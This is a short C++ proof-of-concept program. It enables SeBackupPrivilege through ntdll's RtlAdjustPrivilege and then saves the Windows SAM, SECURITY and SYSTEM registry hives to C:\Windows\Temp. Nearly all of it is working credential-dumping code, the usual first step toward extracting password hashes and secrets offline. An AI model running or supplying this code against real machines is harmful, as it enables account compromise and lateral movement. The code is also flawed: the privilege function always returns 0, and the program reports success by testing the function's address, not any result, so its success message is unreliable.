// This is just a Proof of Concept of using the RtlAdjustPrivilege function
// Once the binary has been compiled, please check the following:
// Open Process Explorer -> Right click on process -> Properties -> Security -> Now verify if SeBackupPrivilege has been added

#include <windows.h>
#include <TlHelp32.h>
#include <winternl.h>
#include <iostream>

using namespace std;

typedef NTSTATUS(NTAPI* set_RtlAdjustPrivilege)
(
    ULONG Privilege, 
    BOOLEAN Enable,
    BOOLEAN Client,
    PBOOLEAN WasEnabled);

BOOL EnablePrivilege()

    {
        BOOLEAN bRes;
        LPVOID RtlAdjustPrivilege_addr = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
        set_RtlAdjustPrivilege RtlHandle = (set_RtlAdjustPrivilege)RtlAdjustPrivilege_addr; 
        if (NT_SUCCESS(RtlHandle(17, TRUE, FALSE, &bRes)))
        {
            cout << "[+] Successfully enabled SeBackupPrivilege via RtlAdjustPrivilege :)\n";
            bRes = TRUE;
        }
        else
        {
            cout << "[-] Failed to enable SeBackupPrivilege via RtlAdjustPrivilege :( " << GetLastError() << endl;

            bRes = FALSE;
        }
        return 0;
    }

void dump_RegHives() {

    // Handle to open registry key
    HKEY hKey = ERROR_SUCCESS; 

    // Dump SAM - Registry Hive
    LPCWSTR lpSubKey = L"SAM";
    LPCWSTR	lpFile = L"C:\\Windows\\Temp\\sam.hive";
    RegOpenKeyEx(HKEY_LOCAL_MACHINE, lpSubKey, ERROR_SUCCESS, READ_CONTROL, &hKey);
    RegSaveKeyExW(hKey, lpFile, ERROR_SUCCESS, KEY_QUERY_VALUE);

    // Dump SECURITY - Registry Hive
    lpSubKey = L"SECURITY";
    lpFile = L"C:\\Windows\\Temp\\security.hive";
    RegOpenKeyEx(HKEY_LOCAL_MACHINE, lpSubKey, ERROR_SUCCESS, READ_CONTROL, &hKey);
    RegSaveKeyExW(hKey, lpFile, ERROR_SUCCESS, KEY_QUERY_VALUE);

    // Dump SYSTEM - Registry Hive
    lpSubKey = L"SYSTEM";
    lpFile = L"C:\\Windows\\Temp\\system.hive";
    RegOpenKeyEx(HKEY_LOCAL_MACHINE, lpSubKey, ERROR_SUCCESS, READ_CONTROL, &hKey);
    RegSaveKeyExW(hKey, lpFile, ERROR_SUCCESS, KEY_QUERY_VALUE);

}

int main() {

    // Enable SeBackupPrivilege privilege
    BOOL privAdded = EnablePrivilege();

    // Dump Registry Hives
    dump_RegHives();
    if (dump_RegHives)
    {
        cout << "[+] Successfully dumped the registry hives in C:\\Windows\\Temp" << endl;
    }
    else
    {
        cout << "[-] Failed to dump the registry hives " << GetLastError() << endl;
    };
    getchar();
}
